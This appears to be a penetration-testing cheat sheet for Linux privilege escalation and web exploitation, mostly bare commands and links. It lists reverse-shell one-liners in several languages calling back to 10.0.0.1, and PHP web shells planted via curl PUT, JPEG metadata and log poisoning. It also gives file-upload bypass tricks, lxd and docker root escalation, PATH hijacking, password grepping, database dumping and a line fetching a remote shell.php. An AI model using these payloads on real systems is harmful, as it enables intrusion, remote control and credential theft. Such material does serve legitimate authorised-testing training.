### [Resources for Linux Privesc]
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

https://github.com/diego-treitos/linux-smart-enumeration

https://github.com/lucyoa/kernel-exploits

https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

### [Running your scripts]
```
chmod +x linpeas.sh
./linpeas > enumData.log

chmod +x ./lse.sh
./lse.sh -l2 >> enumData.log
```

### [Manual enumeration]
```
Enumerating linux OS
cat /etc/os-release

Who else logged in? 
who w last

Enumerating Kernel 
uname -a, env, whoami, history, pwd

Are you in sudoers file? 
sudo -l, cat /etc/sudoers

Other super users? grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'

Able to run the following binaries with current user permissions:
find / -perm -u=s 2>/dev/null

Find files with SUID set
find . -perm /4000 

sudo -l

Check for available shells
cat /etc/shells

Check crons
cat /etc/crontab
```

Processes:
top

https://raw.githubusercontent.com/carlospolop/linux-privilege-escalation-awsome-script/master/linpeas.sh
https://github.com/1N3/PrivEsc/tree/master/linux/scripts

Enumeration of plaintext password
grep -rnw '/' -ie 'pass' --color=always
grep -rnw '/' -ie 'DB_PASS' --color=always
grep -rnw '/' -ie 'DB_PASSWORD' --color=always
grep -rnw '/' -ie 'DB_USER' --color=always

### [Generating Public Keys and Xfering to your target]
```
1. ssh-keygen to create your paired keys (private + public)
2. cat your key.pub and copy and paste the public key data over to the host's authorized keys in /home/username/.ssh/authorized_keys
3. ssh into the box using your private key ssh -i privatekey username@IP
```

### [tty shell]
```
python -c 'import pty; pty.spawn("/bin/sh")'
python2 -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/sh")'
python -c 'import pty; pty.spawn("/bin/bash")'
python2 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/sh -i
perl —e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
(From within IRB)
exec "/bin/sh"
(From within vi)
:!bash
(From within vi)
:set shell=/bin/bash:shell
(From within nmap)
!sh
```
## [reverse TCP Shell's]

#### bash
```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

### perl
```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### php
```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### ruby
```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Netcat
```
nc -e /bin/sh 10.0.0.1 1234
```

### mkfifo
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

### java
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
More information regarding reverse TCP:
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

### [SCP Transfer]
```
Local to Remote
scp file.txt username@IP:/remote/directory
scp -i private_key file.txt username@IP:/remote/directory
(Specify Port)
scp -P 2222 file username@IP:/remote/directory
scp -P port -r folder username@IP:/remote/directory


remote to local
scp remote_username@10.10.0.2:/remote/file.txt /local/directory
scp -r remote_username@10.10.0.2:/remote/folder /local/directory
scp -P port -r remote_username@10.10.0.2:/remote/file.txt /local/directory
scp -P port -r remote_username@10.10.0.2:/remote /local/directory
scp -i privatekey -r remote_username@10.10.0.2:/remote/folder /local/directory
```

### [Extracting Creds from mysql using mysqldump util]
```
Local
mysqldump -u mysql_username -ppassword Database_Name
mysqldump -u mysql_username -ppassword Database table_name

Remotely
mysqldump -h IP -P PORT -u mysql_username -ppassword Database_Name
mysqldump -h IP -P PORT -u mysql_username -ppassword Database_Name Table_Name
```

### [Abusing PATH]
```
Abusing PATH allows you to trick a program into executing your payload instead of the intended program.

/usr/local/sbin/FILE
export PATH=/My/location/of/my/fake/FILE:$PATH

What's inside of FILE? FILE is actually a bash script that executes a payload
cat FILE
whoami

What you should see when the exploit works:
<escalated username> (root *hopefully)
```
More information regarding abusing PATH
https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/

### [Transferring files using netcat]
```
nc -l -p <port> > out.file

nc -w 3 <IP> 1234 < out.file
```
https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/

### [Exploiting lxd]
```
Creating your image:
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine

Importing your image:
lxc image import ./apline-image --alias myimage

Creating your resource pool and initializing your image:
lxd init
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh

Navigation through mount:
cd /mnt/
cd /mnt/root
```
Resources on lxd

https://www.hackingarticles.in/lxd-privilege-escalation/

### [ssh through port 80]
```
sshpass -p tunneler ssh tunneler@10.10.10.10 -p 2222 -L 1234:10.174.12.14:80
curl http://127.0.0.1:1234
```

### [Hacking docker registry]
https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/

### [Exploiting Elastic]
```
Bash Script:

elasticsploit.sh:
read -p 'Enter IP Address only: ' site
read -p 'Enter filename: ' filename

elasticdump \
  --input=http://$site:9200/endpoint \
  --output=$filename.json \
  --type=data
echo "-------------------------------------"
echo $filename".json has been dumped into the current directory"
```

### [OSCP Cheatsheet]
https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets


https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets#uploading-posting-files-through-www-upload-forms

#### POST file
curl -X POST -F "file=@/file/location/shell.php" http://$TARGET/upload.php --cookie "cookie"

### POST binary data to web form
curl -F "field=<shell.zip" http://$TARGET/upld.php -F 'k=v' --cookie "k=v;" -F "submit=true" -L -v

### PUTing File on the Webhost via PUT verb
curl -X PUT -d '<?php system($_GET["c"]);?>' http://$target/shell.php

### Injecting PHP into JPEG
```
exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' backdoor.jpeg
exiftool “-comment<=back.php” back.png
```

### Bypassing File Upload Restrictions
```
file.php -> file.jpg
file.php -> file.php.jpg
file.asp -> file.asp;.jpg
file.gif (contains php code, but starts with string GIF/GIF98)
00%
file.jpg with php backdoor in exif (see below)
.jpg -> proxy intercept -> rename to .php
```
### Local File Inclusion to Shell
```
nc $target 80
GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
Host: $target
Connection: close
```

### [docker privilege escalation]
```
echo -e "FROM ubuntu:14.04\nENV WORKDIR /stuff\nRUN mkdir -p /stuff\nVOLUME [ /stuff ]\nWORKDIR /stuff" > Dockerfile && docker build -t my-docker-image . && docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c 'cp /bin/sh /stuff && chown root.root /stuff/sh && chmod a+s /stuff/sh' && ./sh -c id && ./sh
```

### [php]
https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets#php-1
```
<?php file_put_contents("/var/tmp/shell.php", file_get_contents("http://10.11.0.245/shell.php")); ?>
```

### [searchsploit commands]
```
searchsploit <Service and/or version>

Creates a copy and sends it to your current directory
searchsploit -m script
```
